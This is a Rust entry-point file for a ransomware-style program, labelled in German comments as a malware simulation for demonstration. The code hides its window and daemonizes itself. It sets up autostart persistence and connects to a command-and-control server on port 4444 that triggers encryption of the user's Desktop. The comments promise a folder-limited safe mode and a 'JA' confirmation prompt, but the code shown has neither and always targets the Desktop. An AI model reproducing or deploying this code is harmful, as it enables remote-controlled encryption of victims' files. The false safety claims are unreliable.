#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use rust_mw::{background::daemonize_process, enable_autostart, run_malware_logic, start_c2_loop};
// use std::env;
// use std::io::{self, Write};
use std::path::PathBuf;

// C2 Server Konfiguration
const C2_IP: &str = "127.0.0.1"; // Durch passende IP ersetzen, wenn nicht Local Host 
const C2_PORT: u16 = 4444;

// -----------------------------------------------------------------------------
// ANLEITUNG & WARNUNG
// -----------------------------------------------------------------------------
// Nur für Demonstrationszwecke (Malware Simulation)
//
// Vor dem Start:
// Es gibt zwei mögliche Modi:
//
// 1. Sicherer Modus für Tests (Empfohlen)
//    Startet die Software isoliert für einen spezifischen Ordner.
//    Befehl: cargo run -- <PFAD_ZUM_ORDNER>
//
//    Beispiel:
//      > cargo run -- "C:\Users\Name\Desktop\TestLabor"   (Windows)
//      > cargo run -- ./test_ordner                       (Linux / macOS)
//
// 2. Desktop Modus (Gefährlich)
//    Wird KEIN Pfad angegeben, wird automatisch der Desktop des aktuellen Nutzers gewählt.
//    Befehl: cargo run
//
// SICHERHEITS-MECHANISMUS:
// Egal welcher Modus gewählt wird, das Programm startet nicht sofort.
// Es erfordert eine explizite Bestätigung mit "JA".
// -----------------------------------------------------------------------------

fn main() {
    // 1. Daemonize (= Im Hintergrund ausführen)
    // Unter Linux: fork() des Prozess
    // Unter Windows: Mit Attribut (windwos_subsystem)
    // Trotzdem noch die Funktion für Konsistenz aufrufen

    if let Err(e) = daemonize_process() {
        eprintln!("[!] Fork failed: {}", e);
    }

    // Hinweis: Sobald daemonize unter LInux erfolgreich war, ist der parent tot.
    // Code ab dieser Stelle läuft im Child Process

    let target_path = match dirs::desktop_dir() {
        Some(path) => path,
        None => PathBuf::from("."), // Fallback auf aktuelles Verzeichnis
    };
    let target_dir_str = target_path.to_string_lossy().to_string();

    // Persistance
    let _ = enable_autostart();

    // C2-Loop starten
    start_c2_loop(target_dir_str, C2_IP, C2_PORT, |path_to_encrypt| {
        // callback für Verschlüsselungslogik
        match run_malware_logic(path_to_encrypt) {
            Ok(logs) => Ok(format!("Verschlüsselung erfolgreich:\n{}", logs)),
            Err(e) => Err(anyhow::anyhow!(e)),
        }
    });
}
